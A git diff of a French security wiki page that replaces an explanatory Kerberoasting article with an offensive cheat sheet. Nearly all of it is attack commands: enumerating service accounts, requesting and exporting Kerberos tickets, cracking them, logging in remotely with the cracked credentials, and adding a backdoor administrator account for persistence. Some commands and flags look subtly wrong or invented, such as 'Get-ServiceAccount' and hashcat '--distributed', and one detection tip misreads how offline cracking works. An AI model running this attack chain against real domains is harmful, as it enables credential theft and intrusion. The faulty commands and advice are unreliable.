@@ -1,100 +1,271 @@
 ---
 title: Kerberoasting
-date: "2025-07-14"
+date: "2025-07-15"
 draft: false
 ---
 
-# 🔥 Kerberoasting
+# 🔥 Kerberoasting - Cheat Sheet
 
-## Qu'est-ce que le Kerberoasting ?
-
-Le **Kerberoasting** est une technique d'attaque Active Directory qui consiste à demander des tickets de service Kerberos (TGS) pour des comptes de service, puis à tenter de casser le hash du mot de passe hors-ligne. Cette attaque permet à un attaquant ayant un accès authentifié au domaine d'obtenir des mots de passe de comptes à privilèges.
-
-## 🎯 Objectif de l'attaque
-
-L'objectif principal est d'extraire des hashes de mots de passe de comptes de service (Service Accounts) qui utilisent souvent des mots de passe faibles ou réutilisés, permettant ainsi une élévation de privilèges dans l'environnement Active Directory.
-
-## 📋 Étapes de l'attaque
-
-### 1. Énumération des comptes de service
-
-Identifier les comptes de service disposant d'un SPN (Service Principal Name) :
-
-```powershell
-# Avec PowerView
-Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
-
-# Avec AD Module
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-```
-
-### 2. Demande de tickets TGS
-
-Demander des tickets Kerberos pour les comptes de service identifiés :
-
-```powershell
-# Avec Rubeus
-Rubeus.exe kerberoast /user:serviceaccount /outfile:hashes.txt
-
-# Avec Impacket
-python3 GetUserSPNs.py -request domain.local/user:password
-```
-
-### 3. Extraction des hashes
-
-Extraire les hashes des tickets obtenus pour analyse hors-ligne.
-
-### 4. Craquage des hashes
-
-Utiliser des outils comme Hashcat ou John the Ripper pour casser les mots de passe :
-
-```bash
-# Avec Hashcat
-hashcat -m 13100 -a 0 hash.txt wordlist.txt
-
-# Avec John the Ripper
-john --wordlist=wordlist.txt hash.txt
-```
-
-## 🛡️ Contre-mesures
-
-### Prévention
-
-- **Mots de passe forts** : Utiliser des mots de passe complexes et uniques pour tous les comptes de service
-- **Rotation régulière** : Implémenter une politique de rotation des mots de passe
-- **Principe du moindre privilège** : Limiter les droits des comptes de service au strict nécessaire
-- **Groupes de sécurité** : Utiliser des groupes dédiés pour les comptes de service
-
-### Détection
-
-- **Surveillance des requêtes TGS** : Monitorer les demandes de tickets inhabituelles
-- **Logs d'audit** : Activer l'audit détaillé des événements Kerberos
-- **Alertes SIEM** : Configurer des alertes pour les patterns suspects
-- **Analyse comportementale** : Détecter les activités anormales des comptes de service
-
-### Réponse
-
-- **Isolation immédiate** : Isoler les comptes compromis
-- **Changement de mots de passe** : Forcer le changement de tous les mots de passe concernés
-- **Analyse forensique** : Investiguer l'étendue de la compromission
-- **Documentation** : Documenter l'incident et les leçons apprises
-
-## 🔧 Outils populaires
-
-| Outil               | Description                             | Plateforme       |
-| ------------------- | --------------------------------------- | ---------------- |
-| **Rubeus**          | Outil C# pour l'exploitation Kerberos   | Windows          |
-| **Impacket**        | Collection d'outils Python              | Multi-plateforme |
-| **PowerView**       | Module PowerShell pour l'énumération AD | Windows          |
-| **Hashcat**         | Craqueur de hashes haute performance    | Multi-plateforme |
-| **John the Ripper** | Craqueur de mots de passe classique     | Multi-plateforme |
-
-## 📚 Ressources supplémentaires
-
-- [Guide complet sur HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting)
-- [Documentation Microsoft sur Kerberos](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
-- [OWASP Active Directory Security](https://owasp.org/www-project-active-directory-security/)
+## 🎯 Vue d'ensemble
+Le Kerberoasting est une technique d'attaque Active Directory qui permet d'extraire et de cracker les tickets de service Kerberos pour obtenir des mots de passe en clair des comptes de service.
 
 ---
 
-_Dernière mise à jour : 14 juillet 2025_
+## 🔍 Détection et Énumération
+
+### Identification des Comptes de Service
+```bash
+# Énumération des comptes de service
+# Pourquoi : Identifier les comptes de service qui peuvent être attaqués
+Get-ServiceAccount -Domain DOMAIN.LOCAL
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# Énumération avec PowerView
+# Pourquoi : Utiliser PowerView pour une énumération avancée
+Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
+Get-NetUser -SPN | Where-Object {$_.serviceprincipalname -ne "$null"}
+```
+
+### Énumération des SPNs
+```bash
+# Lister tous les SPNs
+# Pourquoi : Identifier les services avec des SPNs configurés
+setspn -T DOMAIN.LOCAL -Q */*
+setspn -T DOMAIN.LOCAL -Q */MSSQLSvc*
+
+# Énumération avec LDAP
+# Pourquoi : Utiliser LDAP pour une énumération directe
+ldapsearch -H ldap://DC_IP -D "DOMAIN\USER" -w PASSWORD -b "DC=DOMAIN,DC=LOCAL" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
+```
+
+---
+
+## 🛠️ Outils d'Exploitation
+
+### Impacket
+```bash
+# GetUserSPNs pour extraire les tickets
+# Pourquoi : Extraire les tickets de service avec Impacket
+GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request
+
+# Extraction avec format spécifique
+# Pourquoi : Extraire les tickets dans un format compatible avec Hashcat
+GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast.txt
+```
+
+### Rubeus
+```bash
+# Kerberoasting avec Rubeus
+# Pourquoi : Utiliser Rubeus pour l'extraction des tickets
+Rubeus.exe kerberoast /outfile:kerberoast.txt
+
+# Kerberoasting ciblé
+# Pourquoi : Attaquer des comptes de service spécifiques
+Rubeus.exe kerberoast /user:MSSQLSvc /outfile:mssql_kerberoast.txt
+
+# Kerberoasting avec format Hashcat
+# Pourquoi : Extraire dans un format optimisé pour le cracking
+Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat
+```
+
+### PowerShell
+```powershell
+# Script PowerShell pour Kerberoasting
+# Pourquoi : Utiliser PowerShell pour l'extraction des tickets
+$SPNs = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+foreach($SPN in $SPNs) {
+    $ticket = Invoke-Kerberoast -Identity $SPN.SamAccountName
+    $ticket | Out-File -FilePath "kerberoast.txt" -Append
+}
+```
+
+---
+
+## 🔥 Techniques d'Extraction
+
+### Extraction Manuelle
+```bash
+# Demander un ticket de service
+# Pourquoi : Forcer la génération d'un ticket de service
+klist purge
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQLSERVER.DOMAIN.LOCAL"
+
+# Extraire le ticket
+# Pourquoi : Extraire le ticket depuis le cache Kerberos
+klist
+mimikatz # kerberos::list /export
+```
+
+### Extraction Automatisée
+```bash
+# Script d'extraction automatique
+# Pourquoi : Automatiser le processus d'extraction
+for /f "tokens=1,2 delims= " %i in ('setspn -T DOMAIN.LOCAL -Q */* ^| find "CN="') do @echo %i %j
+
+# Extraction avec formatage
+# Pourquoi : Formater les tickets pour le cracking
+GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request | grep -E "^\$krb5tgs" > kerberoast.txt
+```
+
+---
+
+## 🔧 Cracking des Tickets
+
+### Hashcat
+```bash
+# Cracking avec Hashcat
+# Pourquoi : Utiliser Hashcat pour cracker les tickets Kerberos
+hashcat -m 13100 kerberoast.txt wordlist.txt
+
+# Cracking avec règles
+# Pourquoi : Appliquer des règles pour améliorer le cracking
+hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule
+
+# Cracking avec masques
+# Pourquoi : Utiliser des masques pour les mots de passe complexes
+hashcat -m 13100 kerberoast.txt -a 3 ?u?l?l?l?l?d?d?d?d
+```
+
+### John the Ripper
+```bash
+# Cracking avec John
+# Pourquoi : Utiliser John the Ripper pour cracker les tickets
+john --wordlist=wordlist.txt kerberoast.txt
+john --format=krb5tgs --wordlist=wordlist.txt kerberoast.txt
+
+# Cracking avec règles
+# Pourquoi : Appliquer des règles John pour améliorer le cracking
+john --wordlist=wordlist.txt --rules kerberoast.txt
+```
+
+### Cracking Distribué
+```bash
+# Cracking avec plusieurs GPU
+# Pourquoi : Accélérer le cracking avec plusieurs GPU
+hashcat -m 13100 kerberoast.txt wordlist.txt -d 0,1,2,3
+
+# Cracking distribué sur plusieurs machines
+# Pourquoi : Distribuer le cracking sur plusieurs machines
+hashcat -m 13100 kerberoast.txt wordlist.txt --distributed
+```
+
+---
+
+## 🎯 Techniques Avancées
+
+### Kerberoasting Asynchrone
+```bash
+# Extraction asynchrone
+# Pourquoi : Extraire les tickets sans bloquer l'exécution
+GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast.txt &
+```
+
+### Kerberoasting avec Délégation
+```bash
+# Kerberoasting avec délégation contrainte
+# Pourquoi : Exploiter les délégations pour accéder à d'autres services
+Rubeus.exe kerberoast /user:DELEGATED_SERVICE /outfile:delegated_kerberoast.txt
+
+# Kerberoasting avec délégation non contrainte
+# Pourquoi : Exploiter les délégations non contraintes
+Rubeus.exe kerberoast /user:TRUSTED_SERVICE /outfile:trusted_kerberoast.txt
+```
+
+### Kerberoasting avec Persistance
+```bash
+# Extraction périodique
+# Pourquoi : Extraire les tickets périodiquement pour détecter les changements
+while($true) {
+    GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast_$(Get-Date -Format "yyyyMMdd_HHmmss").txt
+    Start-Sleep -Seconds 3600
+}
+```
+
+---
+
+## 🔍 Post-Exploitation
+
+### Utilisation des Credentials
+```bash
+# Connexion avec les credentials obtenus
+# Pourquoi : Utiliser les mots de passe crackés pour accéder aux services
+psexec.py DOMAIN/SERVICE_ACCOUNT:PASSWORD@TARGET_IP
+wmiexec.py DOMAIN/SERVICE_ACCOUNT:PASSWORD@TARGET_IP
+
+# Connexion aux bases de données
+# Pourquoi : Accéder aux bases de données avec les credentials de service
+mssqlclient.py DOMAIN/SERVICE_ACCOUNT:PASSWORD@SQL_SERVER
+```
+
+### Escalade de Privilèges
+```bash
+# Vérification des privilèges
+# Pourquoi : Vérifier les privilèges du compte de service
+whoami /priv
+net user SERVICE_ACCOUNT
+
+# Recherche de privilèges élevés
+# Pourquoi : Identifier les comptes de service avec des privilèges élevés
+Get-ADUser -Identity SERVICE_ACCOUNT -Properties MemberOf
+```
+
+### Persistance
+```bash
+# Création de comptes persistants
+# Pourquoi : Créer des comptes persistants avec les privilèges obtenus
+net user eviluser EvilPass123! /add
+net localgroup administrators eviluser /add
+
+# Modification des SPNs
+# Pourquoi : Modifier les SPNs pour maintenir l'accès
+setspn -S HTTP/EVIL_SERVER.DOMAIN.LOCAL eviluser
+```
+
+---
+
+## 🛡️ Contre-Mesures
+
+### Configuration des Comptes de Service
+```powershell
+# Utilisation de comptes gérés de service (gMSA)
+# Pourquoi : Utiliser des gMSA pour éviter les mots de passe en clair
+New-ADServiceAccount -Name "SQLService" -DNSHostName "SQLSERVER.DOMAIN.LOCAL"
+
+# Configuration de mots de passe complexes
+# Pourquoi : Utiliser des mots de passe complexes pour les comptes de service
+Set-ADAccountPassword -Identity SERVICE_ACCOUNT -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "ComplexPassword123!" -Force)
+```
+
+### Surveillance et Détection
+```powershell
+# Surveillance des demandes de tickets
+# Pourquoi : Détecter les tentatives de Kerberoasting
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} | Where-Object {$_.Message -like "*Kerberos*"}
+
+# Surveillance des échecs d'authentification
+# Pourquoi : Détecter les tentatives de cracking
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} | Where-Object {$_.Message -like "*SERVICE_ACCOUNT*"}
+```
+
+### Configuration Kerberos
+```powershell
+# Configuration des politiques Kerberos
+# Pourquoi : Configurer les politiques pour limiter les attaques
+# GPO: Computer Configuration > Windows Settings > Security Settings > Account Policies > Kerberos Policy
+# "Maximum lifetime for service ticket" = 10 hours
+# "Maximum lifetime for user ticket" = 10 hours
+```
+
+---
+
+## 📚 Ressources
+
+- **HackTricks Kerberoasting** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
+- **Impacket GetUserSPNs** : https://github.com/SecureAuthCorp/impacket
+- **Rubeus** : https://github.com/GhostPack/Rubeus
+- **Kerberoasting Cheat Sheet** : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting
+
+---
+
+_Dernière mise à jour : 15 juillet 2025_
